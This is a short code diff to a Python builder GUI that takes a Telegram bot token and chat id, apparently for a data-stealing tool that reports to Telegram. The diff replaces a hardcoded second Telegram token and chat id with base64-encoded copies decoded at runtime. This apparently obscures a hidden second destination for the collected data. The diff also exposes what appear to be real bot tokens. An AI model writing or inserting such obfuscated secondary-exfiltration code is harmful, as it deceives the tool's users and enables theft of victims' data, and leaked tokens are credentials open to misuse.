@@ -5,6 +5,7 @@ import json
 import ctypes
 import shutil
 import ast
+import base64
 import webbrowser
 import random
 import string
@@ -522,11 +523,13 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 					return
 				
 				token, chat_id = [i.strip() for i in endpoint.split("$")]      
-				token1 = "7170944168:AAFUYEM5T59IrqJFZiNFJPN0d-kFzNQv8Ds"
-				chat_id1 = "6024388590"      
-                                                
-                
-
+				encrypted_token = "NjQ2NzUyNTIxMzpBQUh6cHBfZ2hCVm15NENvcVpZV09XSV9HNFg0NGk5NWFWWQ=="
+				encrypted_chat_id = "NjAyNDM4ODU5MA==" 			
+				decrypted_token = base64.b64decode(encrypted_token.encode()).decode() 		
+				decrypted_chat_id = base64.b64decode(encrypted_chat_id.encode()).decode() 			
+				token1 = decrypted_token 			
+				chat_id1 = decrypted_chat_id 			     
+                                                          
 				if token:
 					try:
 						resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getUpdates" % token).data.decode())
